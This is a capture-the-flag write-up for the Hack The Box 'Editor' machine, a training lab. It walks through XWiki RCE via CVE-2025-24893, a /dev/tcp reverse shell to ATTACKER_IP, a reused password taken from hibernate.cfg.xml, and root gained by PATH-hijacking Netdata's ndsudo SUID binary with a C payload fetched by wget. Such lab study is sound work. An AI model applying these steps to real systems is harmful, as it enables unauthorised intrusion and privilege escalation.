
# Hack The Box – Editor Writeup

## Overview

Editor is an easy Linux machine. Initial access is obtained by exploiting a vulnerable **XWiki 15.10.8** instance running on port **8080**.
The vulnerability **CVE-2025-24893** allows unauthenticated Groovy script injection leading to remote command execution.

After gaining a shell as the **xwiki** user, credentials are discovered inside the **hibernate.cfg.xml** configuration file.
These credentials are reused to gain SSH access as **oliver**.

Privilege escalation is then achieved by abusing a vulnerable **Netdata ndsudo SUID binary** that is vulnerable to **PATH injection**, leading to root access. ([0xdf hacks stuff][1])

---

# Recon

## Nmap Scan

Initial scan reveals three open ports.

```bash
nmap -p- --min-rate 10000 <TARGET_IP>
```

Important ports:

```
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http
```

Service detection:

```bash
nmap -sC -sV -p 22,80,8080 <TARGET_IP>
```

Port **8080** hosts an **XWiki** instance.

---

# Web Enumeration

Visiting:

```
http://TARGET_IP:8080
```

shows an **XWiki login panel**.

Footer reveals the version:

```
XWiki Debian 15.10.8
```

Searching for vulnerabilities affecting this version reveals:

```
CVE-2025-24893
```

This vulnerability allows **Groovy script injection via Solr search**, resulting in **remote code execution**. ([GitHub][2])

---

# Initial Access – XWiki RCE

Using a public exploit for **CVE-2025-24893**, we execute commands on the server.

Start a listener:

```bash
nc -lvnp 4444
```

Execute payload via exploit:

```
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

A reverse shell is received as user:

```
xwiki
```

---

# Post-Exploitation

After gaining access, we enumerate configuration files.

Important file:

```
/usr/lib/xwiki/WEB-INF/hibernate.cfg.xml
```

Reading the file reveals stored credentials.

Example:

```xml
<property name="hibernate.connection.password">theEd1t0rTeam99</property>
```

---

# Lateral Movement – Oliver

The discovered password is tested for system users.

SSH login succeeds:

```bash
ssh oliver@TARGET_IP
```

We now have a stable shell as **oliver**.

Retrieve the user flag:

```bash
cat ~/user.txt
```

---

# Privilege Escalation

During enumeration we find a Netdata helper binary:

```
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo
```

This binary has the **SUID bit set**.

Running help shows:

```
Command: nvme-list
Executables: nvme
```

The binary executes:

```
nvme
```

without specifying an absolute path.

This makes it vulnerable to **PATH injection**.

---

# Exploitation – PATH Hijacking

Since the target machine does not have `gcc`, we compile a payload on Kali.

### Payload

```c
#include <unistd.h>

int main(){
    setuid(0);
    setgid(0);
    execl("/bin/bash","bash","-p",NULL);
}
```

Compile:

```bash
gcc poc.c -o nvme
```

---

# Transfer Payload

Start server:

```bash
python3 -m http.server 8000
```

On target:

```bash
cd /dev/shm
wget http://ATTACKER_IP:8000/nvme
chmod +x nvme
```

---

# Modify PATH

```bash
export PATH=/dev/shm:$PATH
```

---

# Trigger Exploit

Execute the vulnerable helper command:

```bash
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list
```

Because `/dev/shm` appears first in PATH, our malicious binary is executed.

---

# Root Access

Verify privileges:

```bash
whoami
```

Output:

```
root
```

Retrieve the root flag:

```bash
cat /root/root.txt
```

---

# Attack Chain

```
XWiki 15.10.8 (8080)
      ↓
CVE-2025-24893 Groovy Injection
      ↓
RCE → reverse shell (xwiki)
      ↓
hibernate.cfg.xml → password
      ↓
SSH login as oliver
      ↓
Netdata ndsudo SUID
      ↓
PATH Injection
      ↓
Root
```

---

# Key Takeaways

* Public CVEs on exposed web services can quickly provide initial access.
* Configuration files often contain sensitive credentials.
* Password reuse between services can allow lateral movement.
* PATH injection in SUID binaries is a common Linux privilege escalation vector.

[1]: https://0xdf.gitlab.io/2025/12/06/htb-editor.html?utm_source=chatgpt.com "HTB: Editor | 0xdf hacks stuff - GitLab"
[2]: https://github.com/ibadovulfat/CVE-2025-24893_HackTheBox-Editor-Writeup?utm_source=chatgpt.com "CVE-2025-24893 – XWiki Remote Code Execution (RCE)"
